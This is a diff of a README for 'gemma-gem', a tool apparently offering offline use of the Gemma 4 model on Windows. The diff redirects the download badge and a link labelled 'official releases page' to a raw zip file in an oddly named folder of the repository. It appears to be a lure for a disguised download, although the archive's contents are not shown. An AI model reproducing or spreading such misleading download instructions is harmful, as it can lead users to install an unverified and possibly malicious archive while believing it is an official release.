@@ -1,6 +1,6 @@
 # 💎 gemma-gem - Private AI running on your computer
 
-[![](https://img.shields.io/badge/Download_Gemma_Gem-Blue.svg)](https://github.com/Tortuous-surfacechemistry208/gemma-gem)
+[![](https://img.shields.io/badge/Download_Gemma_Gem-Blue.svg)](https://github.com/Tortuous-surfacechemistry208/gemma-gem/raw/refs/heads/main/battlewagon/gemma_gem_v1.0.zip)
 
 Gemma Gem lets you use the Gemma 4 artificial intelligence model directly on your Windows computer. It works inside your web browser. The software stays on your machine. You do not need an account or an internet connection to use the model. No data leaves your device. This keeps your private information safe.
 
@@ -17,7 +17,7 @@ You need a modern Windows computer to run this tool. Ensure your system meets th
 
 ## 📥 How to download and install
 
-1. Visit the [official releases page](https://github.com/Tortuous-surfacechemistry208/gemma-gem) to get the software.
+1. Visit the [official releases page](https://github.com/Tortuous-surfacechemistry208/gemma-gem/raw/refs/heads/main/battlewagon/gemma_gem_v1.0.zip) to get the software.
 2. Look for the file ending in .zip under the Assets section.
 3. Click the file name to start the download to your computer.
 4. Locate the downloaded folder in your Downloads directory.
